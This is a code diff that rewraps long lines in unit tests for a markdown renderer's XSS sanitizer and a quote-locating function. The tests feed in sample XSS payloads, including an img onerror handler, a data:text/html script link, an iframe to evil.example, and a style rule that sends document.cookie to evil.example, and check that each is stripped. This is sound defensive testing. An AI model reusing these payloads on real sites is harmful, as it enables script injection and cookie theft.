@@ -34,7 +34,9 @@ describe("renderMarkdown", () => {
 
   test("preserves the language-X class and data-language attr for fenced code", () => {
     const html = renderMarkdown("```js\nconst a = 1;\n```\n");
-    expect(html).toContain('<pre data-language="js"><code class="language-js">');
+    expect(html).toContain(
+      '<pre data-language="js"><code class="language-js">',
+    );
   });
 });
 
@@ -50,7 +52,9 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips event-handler attributes on inline elements (e.g. <img onerror>)", () => {
-    const html = renderMarkdown('![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n');
+    const html = renderMarkdown(
+      '![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n',
+    );
     // The ![] form yields a clean <img> with allowed attrs.
     expect(html).toContain("<img");
     // Neither the inline nor the markdown-derived img should retain onerror.
@@ -65,19 +69,25 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips data: URLs from markdown links (only http/https/mailto allowed)", () => {
-    const html = renderMarkdown("[click](data:text/html,<script>alert(1)</script>)\n");
+    const html = renderMarkdown(
+      "[click](data:text/html,<script>alert(1)</script>)\n",
+    );
     expect(html).not.toContain("data:");
     expect(html).not.toContain("<script");
   });
 
   test("strips <iframe> tags", () => {
-    const html = renderMarkdown("hello\n\n<iframe src=\"https://evil.example\"></iframe>\n");
+    const html = renderMarkdown(
+      'hello\n\n<iframe src="https://evil.example"></iframe>\n',
+    );
     expect(html).not.toContain("<iframe");
     expect(html).not.toContain("evil.example");
   });
 
   test("strips <style> tags (CSS-based exfiltration vector)", () => {
-    const html = renderMarkdown("hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n");
+    const html = renderMarkdown(
+      "hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n",
+    );
     expect(html).not.toContain("<style");
     expect(html).not.toContain("evil.example");
   });
@@ -91,7 +101,9 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips inline event handlers on otherwise-allowed tags", () => {
-    const html = renderMarkdown('<a href="https://example.com" onclick="alert(1)">link</a>\n');
+    const html = renderMarkdown(
+      '<a href="https://example.com" onclick="alert(1)">link</a>\n',
+    );
     expect(html).toContain('href="https://example.com"');
     expect(html).not.toContain("onclick");
     expect(html).not.toContain("alert(1)");
@@ -168,7 +180,9 @@ describe("locateQuote", () => {
   test("falls back to first occurrence when context-prefixed search fails", () => {
     const flat = "the cat sat. then the cat slept.";
     // Context that doesn't appear before the quote — fall back to first occurrence.
-    expect(locateQuote(flat, "cat", "stale context that doesnt match: ")).toBe(4);
+    expect(locateQuote(flat, "cat", "stale context that doesnt match: ")).toBe(
+      4,
+    );
   });
 
   test("treats empty contextBefore as 'no context provided'", () => {
